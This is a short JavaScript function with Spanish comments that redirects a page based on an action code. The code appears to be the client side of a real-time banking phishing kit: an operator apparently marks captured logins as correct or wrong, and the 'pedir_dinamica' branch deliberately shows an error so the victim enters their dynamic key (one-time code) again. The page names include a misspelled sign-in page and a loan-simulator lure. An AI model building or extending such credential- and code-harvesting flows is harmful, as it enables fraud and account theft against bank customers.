async function handleAction(action, transactionId) {
  const loadingSpinner = document.querySelector(".loadingContainer");
  const errorLogin = document.getElementById("error-login");
  
  console.log("🎯 Manejando acción:", action);
  
  // Extraer el tipo de acción (antes de los dos puntos)
  const actionType = action.split(':')[0];
  
  switch (actionType) {
    case 'correcto':
      console.log("✅ Redirigiendo a loan-simulator...");
      window.location.href = "loan-simulator.html";
      break;
      
    case 'incorrecto':
    case 'error_login':
      console.log("❌ Datos incorrectos, volviendo al login...");
      window.location.href = "accces-sign-in.html?error=1";
      break;
      
    case 'pedir_dinamica':
      console.log("🔐 Solicitando clave dinámica con error...");
      // ⭐ AGREGAR ?error=1 PARA MOSTRAR EL MENSAJE DE ERROR
      window.location.href = "auth-dinamica.html?error=1";
      break;
      
    case 'error_dinamica':
      console.log("⚠️ Error en la dinámica, mostrando mensaje...");
      // ⭐ TAMBIÉN MOSTRAR ERROR Y VOLVER A PEDIR
      window.location.href = "auth-dinamica.html?error=1";
      break;
      
    case 'finish':
      console.log("✔️ Proceso finalizado");
      if (loadingSpinner) loadingSpinner.style.display = "none";
      setTimeout(() => {
        window.location.href = "../index.html";
      }, 2000);
      break;
      
    default:
      console.error("❌ Acción desconocida:", action);
      if (loadingSpinner) loadingSpinner.style.display = "none";
      alert("Error en la validación. Por favor intenta nuevamente.");
      window.location.href = "accces-sign-in.html";
  }
}
